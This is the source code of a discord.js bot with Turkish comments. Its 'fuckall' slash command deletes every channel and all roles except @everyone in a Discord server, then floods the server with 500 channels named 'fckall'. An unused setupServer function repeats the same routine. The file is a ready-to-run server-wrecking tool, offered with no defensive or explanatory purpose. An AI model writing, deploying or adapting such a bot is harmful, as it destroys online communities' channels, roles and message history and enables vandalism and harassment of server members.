require('dotenv').config();
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const token = process.env.TOKEN;

async function setupServer(guild) {
  try {
    console.log(`${guild.name} sunucusunda işlem başlatılıyor...`);

    // Önce tüm kanalları sil
    console.log('Tüm kanallar siliniyor...');
    const channels = await guild.channels.fetch();
    for (const channel of channels.values()) {
      try {
        await channel.delete();
        console.log(`${channel.name} kanalı silindi`);
      } catch (error) {
        console.error(`${channel.name} kanalı silinirken hata:`, error);
      }
    }

    // Rolleri sil
    console.log('Roller siliniyor...');
    const roles = await guild.roles.fetch();
    for (const role of roles.values()) {
      if (role.name !== '@everyone') {
        try {
          await role.delete();
          console.log(`${role.name} rolü silindi`);
        } catch (error) {
          console.error(`${role.name} rolü silinirken hata:`, error);
        }
      }
    }

    // fckall kanallarını oluştur
    console.log('fckall kanalları oluşturuluyor...');
    const channelCount = 500;
    for (let i = 0; i < channelCount; i++) {
      try {
        await guild.channels.create({
          name: 'fckall',
          type: 0,
          permissionOverwrites: [
            {
              id: guild.id,
              allow: ['ViewChannel', 'SendMessages', 'ReadMessageHistory']
            }
          ]
        });
        console.log(`${i + 1}. fckall kanalı oluşturuldu`);
      } catch (error) {
        console.error(`${i + 1}. fckall kanalı oluşturulurken hata:`, error);
      }
    }

    console.log(`${guild.name} sunucusunda işlem tamamlandı!`);
  } catch (error) {
    console.error(`${guild.name} sunucusunda işlem sırasında hata:`, error);
  }
}

async function registerCommands() {
  try {
    const rest = new REST({ version: '10' }).setToken(token);
    const commands = [
      new SlashCommandBuilder()
        .setName('fuckall')
        .setDescription('Sunucudaki her şeyi siler ve 500 kanal açar')
        .setDefaultMemberPermissions('8')
        .toJSON()
    ];
    await rest.put(
      Routes.applicationCommands(client.user.id),
      { body: commands }
    );
    console.log('Slash komutları başarıyla kaydedildi!');
  } catch (error) {
    console.error('Slash komutları kaydedilirken hata:', error);
  }
}

// Bot hazır olduğunda
client.once('ready', async () => {
  console.log(`${client.user.tag} olarak giriş yapıldı!`);
  await registerCommands();
});

// Bot bir sunucuya eklendiğinde
client.on('guildCreate', async guild => {
  console.log(`${guild.name} sunucusuna eklendi!`);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;
  if (interaction.commandName === 'fuckall') {
    if (!interaction.memberPermissions.has('Administrator')) {
      await interaction.reply({ content: 'Bu komutu kullanma yetkiniz yok!', ephemeral: true });
      return;
    }
    
    await interaction.deferReply({ ephemeral: true });

    const guild = interaction.guild;

    // 1. Tüm kanalları sil
    const channels = await guild.channels.fetch();
    for (const channel of channels.values()) {
      try { await channel.delete(); } catch {}
    }

    // 2. Tüm rolleri sil (sadece @everyone hariç)
    const roles = await guild.roles.fetch();
    for (const role of roles.values()) {
      if (role.name !== '@everyone') {
        try { await role.delete(); } catch {}
      }
    }

    // 3. 500 tane fckall kanalı oluştur
    for (let i = 0; i < 500; i++) {
      try {
        await guild.channels.create({
          name: 'fckall',
          type: 0,
          permissionOverwrites: [
            {
              id: guild.id,
              allow: ['ViewChannel', 'SendMessages', 'ReadMessageHistory']
            }
          ]
        });
      } catch {}
    }

    await interaction.editReply('İşlem tamamlandı!');
  }
});

client.login(token).catch(error => {
  console.error('Bot giriş yaparken hata:', error);
});